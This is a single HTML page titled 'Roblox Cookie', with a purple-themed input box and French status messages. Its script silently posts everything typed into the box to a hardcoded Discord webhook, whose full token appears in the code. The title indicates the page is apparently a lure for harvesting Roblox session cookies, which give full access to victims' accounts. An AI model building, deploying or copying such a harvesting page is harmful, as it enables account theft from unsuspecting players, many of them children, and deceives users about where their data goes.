<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="16" r="14" fill="%239333ea" opacity="0.8"/><circle cx="16" cy="16" r="10" fill="%237c3aed"/><circle cx="16" cy="16" r="6" fill="%23a855f7"/></svg>') 16 16, auto;
        }

        *:hover {
            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="16" r="14" fill="%239333ea" opacity="1"/><circle cx="16" cy="16" r="10" fill="%23a855f7"/><circle cx="16" cy="16" r="6" fill="%23e9d5ff"/></svg>') 16 16, auto;
        }

        body {
            width: 100%;
            height: 100vh;
            background: linear-gradient(135deg, #1a1625 0%, #2d1b4e 25%, #16213e 50%, #0f2027 75%, #1a1625 100%);
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* Smooth gradient mesh background */
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .gradient-blob-1 {
            position: absolute;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle at 30% 30%, rgba(147, 51, 234, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            top: -100px;
            left: -100px;
            filter: blur(40px);
        }

        .gradient-blob-2 {
            position: absolute;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle at 70% 70%, rgba(99, 102, 241, 0.12) 0%, transparent 70%);
            border-radius: 50%;
            bottom: -100px;
            right: -100px;
            filter: blur(40px);
        }

        .gradient-blob-3 {
            position: absolute;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle at 50% 50%, rgba(168, 85, 247, 0.1) 0%, transparent 70%);
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            filter: blur(50px);
        }

        /* Title */
        .title {
            position: relative;
            z-index: 10;
            font-size: 56px;
            font-weight: 900;
            margin-bottom: 100px;
            letter-spacing: 3px;
            text-align: center;
        }

        .title-word-1 {
            color: #ffffff;
            display: inline-block;
            margin-right: 15px;
        }

        .title-word-2 {
            background: linear-gradient(135deg, #9333ea, #a855f7, #d8b4fe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
            font-weight: 900;
            filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.4));
        }

        /* Input bar styling */
        .text-bar {
            position: relative;
            z-index: 100;
            opacity: 1;
            pointer-events: all;
        }

        .text-bar-content {
            background: rgba(26, 22, 37, 0.8);
            border: 2px solid #9333ea;
            padding: 20px 30px;
            color: #ffffff;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            box-shadow: 0 20px 60px rgba(147, 51, 234, 0.25), inset 0 0 20px rgba(147, 51, 234, 0.05);
            border-radius: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(20px);
            transition: all 0.3s ease;
        }

        .text-bar-content:hover {
            border-color: #a855f7;
            box-shadow: 0 20px 80px rgba(147, 51, 234, 0.35), inset 0 0 30px rgba(147, 51, 234, 0.1);
        }

        .text-bar-content:focus-within {
            border-color: #c084fc;
            box-shadow: 0 25px 100px rgba(147, 51, 234, 0.4), inset 0 0 40px rgba(147, 51, 234, 0.15);
        }

        .text-bar-prompt {
            color: #9333ea;
            white-space: nowrap;
            font-weight: bold;
            font-size: 16px;
        }

        .text-bar-input {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            outline: none;
            min-width: 450px;
            font-weight: 500;
        }

        .text-bar-input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .text-bar-input:focus::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        .status-message {
            position: fixed;
            top: 30px;
            right: 30px;
            color: #9333ea;
            font-size: 14px;
            z-index: 5;
            transition: opacity 0.3s ease;
            background: rgba(26, 22, 37, 0.9);
            padding: 15px 20px;
            border-radius: 10px;
            border: 1px solid rgba(147, 51, 234, 0.3);
            backdrop-filter: blur(20px);
            font-weight: 500;
        }

        .status-message.hidden {
            opacity: 0;
            pointer-events: none;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .title {
                font-size: 36px;
                margin-bottom: 60px;
            }

            .text-bar-input {
                min-width: 250px;
            }

            .text-bar-content {
                padding: 15px 20px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="bg-container">
        <div class="gradient-blob-1"></div>
        <div class="gradient-blob-2"></div>
        <div class="gradient-blob-3"></div>
    </div>

    <div class="title">
        <span class="title-word-1">Roblox</span>
        <span class="title-word-2">Cookie</span>
    </div>

    <div class="text-bar" id="textBar">
        <div class="text-bar-content">
            <span class="text-bar-prompt">> </span>
            <input type="text" class="text-bar-input" id="userInput" placeholder="ENTRER LE MESSAGE..." autocomplete="off">
        </div>
    </div>

    <div class="status-message hidden" id="statusMessage"></div>

    <script>
        // Discord Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512483780990996510/M32pQZDO3_rDZ6_lY_lJDJB-wV6XTzKDqvHCWDWaJClelP8y79wqmgpLGJ09DtPMASMK';

        // Input bar logic
        const userInput = document.getElementById('userInput');
        const statusMessage = document.getElementById('statusMessage');

        function showStatus(message, duration = 3000) {
            statusMessage.textContent = message;
            statusMessage.classList.remove('hidden');
            setTimeout(() => {
                statusMessage.classList.add('hidden');
            }, duration);
        }

        // Discord webhook integration
        userInput.addEventListener('keypress', async (e) => {
            if (e.key === 'Enter' && userInput.value.trim()) {
                const message = userInput.value.trim();
                userInput.value = '';
                userInput.disabled = true;

                try {
                    showStatus('📤 ENVOI DU MESSAGE...');

                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: message,
                            username: 'Roblox Cookie',
                            avatar_url: 'https://images.emojiterra.com/twitter/v14.0/128px/1f36a.png'
                        })
                    });

                    if (response.ok) {
                        showStatus('✅ MESSAGE ENVOYÉ AVEC SUCCÈS');
                    } else {
                        showStatus('❌ ERREUR LORS DE L\'ENVOI');
                    }
                } catch (error) {
                    console.error('Erreur:', error);
                    showStatus('❌ ERREUR DE CONNEXION');
                } finally {
                    userInput.disabled = false;
                    userInput.focus();
                }
            }
        });

        userInput.focus();
    </script>
</body>
</html>
